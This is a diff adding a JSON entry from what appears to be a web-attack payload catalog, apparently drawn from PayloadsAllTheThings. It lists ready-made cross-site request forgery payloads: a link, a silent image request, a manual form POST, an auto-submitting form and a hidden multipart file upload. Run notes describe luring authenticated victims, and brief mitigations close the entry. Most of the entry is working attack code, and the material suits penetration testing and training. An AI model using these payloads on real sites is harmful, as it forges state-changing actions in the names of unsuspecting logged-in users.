@@ -1,0 +1,89 @@
+{
+  "id": "payload_000023",
+  "important": {
+    "title": "CSRF - HTML GET/POST / AutoSubmit / File Upload",
+    "category": "Web Vulnerabilities",
+    "sub_category": "CSRF - HTML Methods",
+    "tags": ["csrf","html-get","html-post","autosubmit","multipart","file-upload"],
+    "targets": { "os": ["Any"], "system": ["Web App","Browser"] },
+    "risk": "high"
+  },
+  "variants": [
+    {
+      "match": { "os": ["Any"], "system": ["HTML GET (user interaction)"] },
+      "payload": {
+        "explanation": "HTML anchor that triggers a state-changing GET when clicked (requires user interaction).",
+        "code": "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>",
+        "run_context": "Host on attacker-controlled page; lure victim to click the link while authenticated.",
+        "placeholders": { "TARGET_URL": "http://www.example.com/api/setusername?username=CSRFd" },
+        "notes": "Only works if target accepts GET for state changes and relies on cookies for auth."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["HTML GET (no interaction)"] },
+      "payload": {
+        "explanation": "Embed image to issue GET request without user click.",
+        "code": "<img src=\"http://www.example.com/api/setusername?username=CSRFd\">",
+        "run_context": "Host in attacker page; victim's browser will request the URL automatically.",
+        "placeholders": {},
+        "notes": "Same limitations as HTML GET; useful for silent exploitation."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["HTML POST (manual submit)"] },
+      "payload": {
+        "explanation": "Form-based POST that requires user to press submit (user interaction).",
+        "code": "<form action=\"http://www.example.com/api/setusername\" method=\"POST\" enctype=\"text/plain\">\n  <input name=\"username\" type=\"hidden\" value=\"CSRFd\" />\n  <input type=\"submit\" value=\"Submit Request\" />\n</form>",
+        "run_context": "Host attacker page and trick user to click submit.",
+        "placeholders": {},
+        "notes": "Works when target accepts form POSTs and authentication cookies are sent automatically."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["HTML POST (autosubmit)"] },
+      "payload": {
+        "explanation": "Auto-submitting form to perform POST without interaction.",
+        "code": "<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" method=\"POST\" enctype=\"text/plain\">\n  <input name=\"username\" type=\"hidden\" value=\"CSRFd\" />\n</form>\n<script>document.getElementById('autosubmit').submit();</script>",
+        "run_context": "Victim visits attacker page; form auto-submits using victim cookies.",
+        "placeholders": {},
+        "notes": "Some browsers may restrict auto-submitted forms for cross-site requests; test target behavior."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["HTML POST (multipart file)"] },
+      "payload": {
+        "explanation": "Construct and submit multipart/form-data with a file field to trigger server-side file upload endpoints.",
+        "code": "<script>\nfunction launch(){\n  const dT = new DataTransfer();\n  const file = new File([\"CSRF-filecontent\"], \"CSRF-filename\");\n  dT.items.add(file);\n  document.xss[0].files = dT.files;\n  document.xss.submit();\n}\n</script>\n<form style=\"display:none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\">\n  <input id=\"file\" type=\"file\" name=\"file\"/>\n</form>\n<button onclick=\"launch()\">Submit Request</button>",
+        "run_context": "Attacker page with user interaction to trigger file upload; some browsers restrict programmatic file setting.",
+        "placeholders": { "TARGET": "http://www.example.com/upload" },
+        "notes": "Requires browser support for DataTransfer API and acceptance of file uploads by target."
+      }
+    }
+  ],
+  "usage": {
+    "steps": [
+      "Identify state-changing endpoints and request methods used by the app.",
+      "Test simple HTML GET and POST PoCs in a controlled environment.",
+      "Use auto-submit for silent attempts, but account for browser protections.",
+      "For file-upload attacks, verify whether programmatic file injection is permitted in the target browser/context."
+    ],
+    "tools": ["0xInfection/XSRFProbe","Burp Suite","Browser devtools"],
+    "required_params": {
+      "target_url": { "required": true, "example": "http://www.example.com/api/setusername" }
+    },
+    "code_samples": [
+      { "title": "HTML GET (img)", "code": "<img src=\"http://www.example.com/api/setusername?username=CSRFd\">", "run_context": "browser" },
+      { "title": "HTML POST (autosubmit)", "code": "<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" method=\"POST\" enctype=\"text/plain\"><input name=\"username\" type=\"hidden\" value=\"CSRFd\" /></form><script>document.getElementById('autosubmit').submit();</script>", "run_context": "browser" }
+    ],
+    "mitigations": [
+      "Use per-request CSRF tokens (synchronized token pattern) and validate them server-side.",
+      "Check Origin and Referer headers for state-changing requests.",
+      "Require same-site cookies (SameSite=strict/lax as appropriate) and consider using SameSite=Lax for sensitive flows.",
+      "Require re-authentication for high-value actions and avoid state changes via GET."
+    ],
+    "references": ["OWASP CSRF Cheat Sheet","0xInfection/XSRFProbe"]
+  },
+  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
+}
+
+
